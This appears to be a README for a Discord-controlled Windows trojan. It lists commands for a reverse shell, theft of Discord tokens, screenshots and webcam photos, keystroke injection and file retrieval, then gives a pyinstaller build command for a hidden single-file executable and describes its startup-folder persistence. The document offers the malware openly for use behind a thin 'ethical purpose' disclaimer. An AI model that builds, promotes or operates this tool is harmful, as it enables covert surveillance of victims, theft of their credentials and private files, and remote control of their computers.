# LeChuck-DiscordTrojan
A trojan for pc that can be controlled via discord, Reverse shell (powershell, cmd, python), Get pc informations, desktop alerts, take pictures (screenshot, photos), simulate a virtual keyboard, get files


<br>

> ## Commands:

<hr>


```
> help [pc name] 
==================[ PC INFO ]==================
> connections
> token [pc name]
> ipinfo [pc name] 
> info [pc name] 
> advence_info [pc name]
> battery [pc name]

==================[ REVERSE SHELL ]==================
> cmd [pc name] [command]
> powershell [pc name] [command]
> py [pc name] [script]

==================[ ALERTS ]==================
> alert [pc name] [title];[text];[button]
> textbox [pc name] [title];[text]

==================[ PICTURE ]==================
> photo [pc name]
> screenshot [pc name]

==================[ KEYBOARD ]==================
> keydown [pc name] [key]
> keyup [pc name] [key]
> press [pc name] [key]
> write [pc name] [text]
> writee [pc name] [text]

==================[ FILES ]==================
> cd [pc name] [directory]
> dir [pc name]
> file [pc name] [file name]
```

<br>
<hr>
<br>

> ### generate exe :
> ```yaml
> pyinstaller --noconfirm --onefile --icon "" --windowed "main.py"
> ```

> ### remove the trojan:
> cmd:
> ```yaml
> C:\>taskkill /f /im trojan_name.exe
> ```
> open `"C:\Users\[COMPUTER USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"` in the file explorer
>
> and then remove [trojan name].exe

> ### remove the trojan via discord:
> `>cmd [pc name] taskkill /f /im trojan_name.exe`
>
> `>cmd [pc name] del "C:\Users\`[COMPUTER USERNAME]`\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`[TROJAN NAME]`.exe"`


<br>
<hr>
<br>

> TOS:
> ```yaml
> - this trojan was created for ETHICAL purpose
> - don't use it on people who haven't given you permission
> ```
